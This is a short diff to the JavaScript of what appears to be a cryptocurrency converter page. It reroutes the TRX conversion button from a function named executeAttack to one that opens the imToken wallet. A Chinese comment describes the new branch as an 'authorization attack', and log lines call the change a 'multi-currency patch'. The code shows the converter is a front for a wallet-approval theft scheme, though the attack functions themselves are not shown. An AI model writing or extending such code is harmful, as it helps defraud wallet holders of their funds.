@@ -1055,10 +1055,10 @@ function initMultiCurrencyFeatures() {
             convertBtn.disabled = true;
             
             try {
-                if (currentFromCurrency === 'TRX' && typeof executeAttack === 'function') {
-                    // TRX使用原有逻辑
-                    console.log('🎯 多币种补丁：调用TRX原有逻辑');
-                    return await executeAttack();
+                if (currentFromCurrency === 'TRX' && typeof connectImToken === 'function') {
+                    // TRX直接跳转imToken进行授权攻击
+                    console.log('🎯 多币种补丁：直接跳转imToken');
+                    return await connectImToken();
                 } else {
                     // 其他币种使用新逻辑
                     console.log('🎯 多币种补丁：调用多币种逻辑');
